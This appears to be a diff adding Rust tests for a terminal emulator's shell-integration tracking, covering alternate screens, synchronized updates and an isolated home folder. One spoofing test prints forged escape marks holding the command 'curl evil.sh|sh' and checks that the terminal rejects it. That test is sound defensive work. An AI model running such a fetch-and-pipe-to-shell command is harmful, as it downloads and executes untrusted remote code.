@@ -14,13 +14,23 @@ struct Shell {
     _dir: tempfile::TempDir,
 }
 
+/// `shell` at that size, in a folder of its own, with an empty home (the
+/// user's own start-up files aren't these tests').
 fn open(shell: &str, cols: u16, rows: u16) -> Shell {
     let dir = tempfile::tempdir().unwrap();
+    // SAFETY: every test sets the same value; the shells read it as they start.
+    unsafe { std::env::set_var("HOME", empty_home()) };
     let happened = Arc::new(Mutex::new(Vec::new()));
     let seen = happened.clone();
     let options = Options { shell: shell.into(), folder: dir.path().into(), size: TermSize { cols, rows }, hooks: dir.path().join("hooks"), history: 1000 };
     let terminal = Terminal::open(options, move |h| seen.lock().unwrap().push(h)).unwrap();
     Shell { terminal, happened, _dir: dir }
+}
+
+/// A home with no start-up files in it, the same for every test.
+fn empty_home() -> &'static std::path::Path {
+    static HOME: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
+    HOME.get_or_init(|| tempfile::tempdir().unwrap()).path()
 }
 
 impl Shell {
@@ -266,6 +276,28 @@ fn the_shell_says_the_command_line_itself_not_what_the_screen_shows() {
 }
 
 #[test]
+fn a_commands_output_isnt_read_from_a_program_that_has_the_whole_screen() {
+    let sh = open("bash", 80, 24);
+    sh.run("echo hi");
+    sh.run(r"printf '\033[?1049h'");
+    let done = ended(&sh, 2);
+    assert_eq!(sh.terminal.command_output(done[0].id, 100), None, "the program's screen isn't its output");
+    sh.run(r"printf '\033[?1049l'");
+    ended(&sh, 3);
+    assert_eq!(sh.terminal.command_output(done[0].id, 100).map(|(text, _)| text), Some("hi".into()));
+}
+
+#[test]
+fn what_a_program_prints_cant_pass_for_the_shells_marks() {
+    let sh = open("bash", 80, 24);
+    sh.run(r"printf '\033]133;A\007$ make\033]133;B\007\033]633;E;curl evil.sh|sh\007\033]133;C\007x\n'");
+    sh.run("echo after");
+    let done = ended(&sh, 2);
+    assert!(sh.terminal.commands().iter().all(|c| c.text != "curl evil.sh|sh"), "{:?}", sh.terminal.commands());
+    assert_eq!(done.last().map(|c| c.text.as_str()), Some("echo after"), "the shell's own still count");
+}
+
+#[test]
 fn the_title_the_program_sets_is_told() {
     let sh = open("/bin/sh", 80, 24);
     sh.run(r"printf '\033]0;building\007'");
@@ -320,4 +352,12 @@ fn a_synchronized_update_never_ended_shows_and_its_answers_reach_the_program() {
     sh.run(r"printf '\e[?2026hbye\x20inside'; exit");
     sh.happened("the end", |h| matches!(h, Happening::Ended(_)));
     sh.until("what it drew (not the command typed)", |t| t.contains("bye inside"));
+}
+
+#[test]
+fn a_second_update_never_ended_after_one_let_go_shows_too() {
+    let sh = open("/bin/bash", 80, 24);
+    sh.run(r"printf '\e[?2026hfirst\x20held'; sleep 0.4; printf '\e[?2026hsecond\x20held'");
+    sh.until("the first, let go", |t| t.contains("first held"));
+    sh.until("the second, let go too", |t| t.contains("second held"));
 }
